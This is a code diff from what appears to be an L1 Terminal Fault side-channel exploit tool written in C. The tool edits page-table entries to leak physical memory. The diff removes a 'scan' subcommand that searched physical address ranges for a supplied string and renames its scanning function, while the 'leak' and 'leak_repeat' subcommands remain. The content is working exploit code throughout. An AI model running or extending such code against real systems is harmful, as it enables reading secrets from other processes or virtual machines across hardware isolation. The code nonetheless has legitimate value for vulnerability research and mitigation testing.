@@ -432,7 +432,7 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   ptedit_cleanup();
 }
 
-void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]) {
+void find_ffff_values(scan_opts_t scan_opts) {
   initialize_pteditor_lib();
   full_reload_buffer_t reload_buffer = {0};
   leak_addr_t leak = l1tf_leak_buffer_create();
@@ -571,84 +571,6 @@ void *l1tf_spawn_leak_page(void) {
   return leak_page;
 }
 
-int l1tf_main_scan(const int argc, char *argv[argc]) {
-  uintptr_t start_addr = -1;
-  size_t stride = getpagesize();
-  size_t length = -1;
-
-  static struct option options[] = {
-      {"start", required_argument, 0, 's'},
-      {"length", required_argument, 0, 'l'},
-      {"stride", required_argument, 0, 't'},
-  };
-  while (true) {
-    int option_idx = 0;
-    int choice = getopt_long(argc, argv, "s:l:t:", options, &option_idx);
-    if (choice == -1) {
-      break;
-    }
-
-    char *tail = NULL;
-    switch (choice) {
-    case 's':
-      start_addr = strtoull(optarg, &tail, 16);
-      if (tail == optarg) {
-        fprintf(stderr, "Failed to parse physical start address as hexadecimal\n");
-        exit(1);
-      }
-      break;
-    case 'l':
-      length = strtoull(optarg, &tail, 10);
-      if (tail == optarg) {
-        fprintf(stderr, "Failed to parse scanning range length\n");
-        exit(1);
-      }
-      if (length == 0) {
-        fprintf(stderr, "Length cannot be 0\n");
-        exit(1);
-      }
-      break;
-    case 't':
-      stride = strtoull(optarg, &tail, 10);
-      if (tail == optarg) {
-        fprintf(stderr, "Failed to parse stride\n");
-        exit(1);
-      }
-    }
-  }
-
-  char needle[128] = {0};
-  ssize_t needle_size = read(STDIN_FILENO, needle, 128);
-
-  if (start_addr == (uintptr_t)-1 || length == (uintptr_t)-1 || needle_size <= 0) {
-    fprintf(stderr,
-            "Required arguments of scan subcommand\n"
-            "\t-%c, --%s\thexadecimal physcial address where you "
-            "want to start scanning from\n"
-            "\t-%c, --%s\tthe length of the range that you want to scan in "
-            "bytes\n"
-            "\t-%c, --%s\tthe stride between every check, defaults to one page\n"
-            "Make sure to pass the needle in via stdin\n",
-            options[0].val, options[0].name, options[1].val, options[1].name, options[2].val,
-            options[2].name);
-    exit(1);
-  }
-
-  uintptr_t end_addr = start_addr + length;
-  assert(end_addr > start_addr);
-
-  fprintf(stderr,
-          "Starting to scan for matches in the range 0x%lx-0x%lx for the "
-          "string\n\t\"%s\"\n",
-          start_addr, end_addr, needle);
-  scan_opts_t scan_ops;
-  scan_ops.start = start_addr;
-  scan_ops.end = end_addr;
-  scan_ops.stride = stride;
-  do_scan(scan_ops, needle_size, needle);
-  return 0;
-}
-
 int l1tf_main(int argc, char *argv[argc]) {
   assert(argc > 0);
 
@@ -657,8 +579,6 @@ int l1tf_main(int argc, char *argv[argc]) {
       return l1tf_main_leak(argc, argv, l1tf_do_leak);
     } else if (!strcmp("leak_repeat", argv[1])) {
       return l1tf_main_leak(argc, argv, l1tf_do_leak_nibblewise);
-    } else if (!strcmp("scan", argv[1])) {
-      return l1tf_main_scan(argc, argv);
     }
   }
 
@@ -666,8 +586,7 @@ int l1tf_main(int argc, char *argv[argc]) {
   fprintf(stderr,
           "Usage\n"
           "\t%s leak\n"
-          "\t%s leak_repeat\n"
-          "\t%s scan\n",
-          name, name, name);
+          "\t%s leak_repeat\n",
+          name, name);
   exit(1);
 }
